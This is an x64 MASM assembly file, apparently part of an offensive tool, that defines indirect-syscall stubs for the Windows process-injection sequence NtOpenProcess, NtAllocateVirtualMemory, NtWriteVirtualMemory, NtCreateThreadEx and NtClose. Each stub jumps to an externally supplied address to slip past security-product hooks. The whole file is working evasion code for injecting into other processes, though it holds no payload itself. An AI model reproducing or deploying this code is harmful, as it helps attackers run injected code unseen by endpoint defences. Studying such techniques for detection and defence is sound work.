; WINDOWS 11, 22H2 22621

.data

EXTERN OpenProcessSSN:DWORD          
EXTERN OpenProcessJMP:QWORD

EXTERN AllocateMemSSN:DWORD
EXTERN AllocateMemJMP:QWORD

EXTERN WriteMemSSN:DWORD
EXTERN WriteMemJMP:QWORD  

EXTERN CreateThreadSSN:DWORD       
EXTERN CreateThreadJMP:QWORD 

EXTERN CloseSSN:DWORD
EXTERN CloseJMP:QWORD

.code

NtOpenProcess PROC
		mov r10, rcx
		mov eax, OpenProcessSSN
		jmp qword ptr [OpenProcessJMP]
		ret
NtOpenProcess ENDP

NtAllocateVirtualMemory PROC
		mov r10, rcx
		mov eax, AllocateMemSSN
		jmp qword ptr [AllocateMemJMP]
		ret
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
		mov r10, rcx
		mov eax, WriteMemSSN
		jmp qword ptr [WriteMemJMP]
		ret
NtWriteVirtualMemory ENDP

NtCreateThreadEx PROC
		mov r10, rcx
		mov eax, CreateThreadSSN
		jmp qword ptr [CreateThreadJMP]
		ret
NtCreateThreadEx ENDP

NtClose PROC
		mov r10, rcx
		mov eax, CloseSSN
		jmp qword ptr [CloseJMP]
		ret
NtClose ENDP

end